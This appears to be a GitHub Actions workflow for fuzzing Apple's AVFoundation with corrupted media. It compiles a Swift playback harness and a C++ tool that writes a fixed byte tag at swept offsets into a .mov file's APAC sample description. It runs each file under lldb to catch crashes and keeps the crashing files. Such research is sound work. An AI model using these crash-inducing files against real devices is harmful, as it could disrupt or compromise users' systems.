name: Advanced AVPlayer Stress Harness
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  stress-test-avplayer:
    runs-on: macos-latest
    
    strategy:
      fail-fast: false
      matrix:
        # We are focusing on the two most promising scenarios that are compatible with the runner environment.
        test_scenario: [ 'offset_fuzz', 'rapid_start_stop' ]

    steps:
      # --- SETUP PHASE ---
      - name: Clone Your Repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # Create a more advanced Swift harness that supports different test modes
      - name: Create Advanced Swift Player Harness
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating advanced Swift audio player harness..."
          cat > harness.swift << 'EOF'
          import Foundation
          import AVFoundation

          class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
              var playingCount = 0
              func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
                  playingCount -= 1
              }
              func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
                  print("Harness Decode Error: \(error?.localizedDescription ?? "unknown error")")
                  playingCount -= 1
              }
          }

          if CommandLine.arguments.count < 3 {
              print("Usage: ./harness <mode> <file_path>")
              print("Modes: single, loop, concurrent, rapid")
              exit(1)
          }

          let mode = CommandLine.arguments[1]
          let filePath = CommandLine.arguments[2]
          let fileURL = URL(fileURLWithPath: filePath)
          let delegate = PlayerDelegate()

          print("Running in mode: \(mode) with file: \(filePath)")

          do {
              switch mode {
              case "rapid":
                  let player = try AVAudioPlayer(contentsOf: fileURL)
                  for _ in 0..<500 {
                      player.play()
                      if player.isPlaying { player.stop() }
                  }
              default: // "single"
                  let player = try AVAudioPlayer(contentsOf: fileURL)
                  delegate.playingCount = 1
                  player.delegate = delegate
                  player.play()
                  while delegate.playingCount > 0 { RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1)) }
              }
          } catch {
              print("Harness failed to initialize player: \(error.localizedDescription)")
          }
          print("Harness finished mode: \(mode)")
          EOF

      # Create a C++ utility that can perform different types of corruption
      - name: Create Advanced C++ File Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Creating advanced C++ file corruption utility..."
          cat > corruptor.cpp << 'EOF'
          #include <stdio.h>
          #include <stdlib.h>
          #include <time.h>
          #include <string.h>

          int main(int argc, const char * argv[]) {
              if (argc != 4) {
                  fprintf(stderr, "Usage: %s <file> <offset> <corruption_mode>\n", argv[0]);
                  fprintf(stderr, "Modes: tag\n");
                  return 1;
              }

              const char* filePath = argv[1];
              long offset = atol(argv[2]);
              const char* mode = argv[3];

              FILE *file = fopen(filePath, "r+b");
              if (!file) { return 1; }

              fseek(file, offset, SEEK_SET);

              if (strcmp(mode, "tag") == 0) {
                  unsigned char tag[4] = {0x01, 0x01, 0x00, 0xFF};
                  fwrite(tag, 1, sizeof(tag), file);
              }
              
              fclose(file);
              return 0;
          }
          EOF

      - name: Setup Environment
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      - name: Compile Custom Tools
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling utilities..."
          swiftc harness.swift -o harness
          clang++ -g corruptor.cpp -o corruptor
          if [ ! -f ./harness ] || [ ! -f ./corruptor ]; then
            echo "Tool compilation failed."
            exit 1
          fi

      # --- TEST EXECUTION PHASE ---

      - name: Run Offset Fuzzing Test
        if: matrix.test_scenario == 'offset_fuzz'
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "### Starting Offset Fuzzing Scenario ###"
          mkdir -p test_results
          # Iterate over a range of offsets around our known target
          for offset in $(seq 3400 20 3600); do
            echo "--- Testing offset ${offset} ---"
            POC_FILE="output_offset_${offset}.mp4"
            LOG_FILE="test_results/log_offset_${offset}.txt"
            cp IMG_1047.mov "$POC_FILE"
            # Calculate the final corruption offset
            CORRUPTION_OFFSET=$(( ${offset} + 72 ))
            ./corruptor "$POC_FILE" $CORRUPTION_OFFSET "tag"
            
            lldb -b -o "run" -o "bt" -o "quit" -- ./harness single "$POC_FILE" > "$LOG_FILE" 2>&1 || true
            if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
              echo "✅✅✅ CRASH DETECTED for offset ${offset} ✅✅✅"
              cat "$LOG_FILE"
            else
              rm "$LOG_FILE" # Clean up non-crashing logs
            fi
          done

      - name: Run Rapid Start/Stop Test
        if: matrix.test_scenario == 'rapid_start_stop'
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "### Starting Rapid Start/Stop Scenario ###"
          mkdir -p test_results
          POC_FILE="output_rapid.mp4"
          LOG_FILE="test_results/log_rapid.txt"
          cp IMG_1047.mov "$POC_FILE"
          # Corrupt at the known-good APAC stsd offset
          ./corruptor "$POC_FILE" 3533 "tag"
          
          lldb -b -o "run" -o "bt" -o "quit" -- ./harness rapid "$POC_FILE" > "$LOG_FILE" 2>&1 || true
          if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
            echo "✅✅✅ CRASH DETECTED during rapid start/stop ✅✅✅"
            cat "$LOG_FILE"
          else
             rm "$LOG_FILE"
          fi
          
      # Upload all artifacts for analysis
      - name: Upload All Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: stress-test-artifacts-${{ matrix.test_scenario }}
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_*.mp4
            AppleTest2/apple-positional-audio-codec-invalid-header-main/test_results/
          retention-days: 7
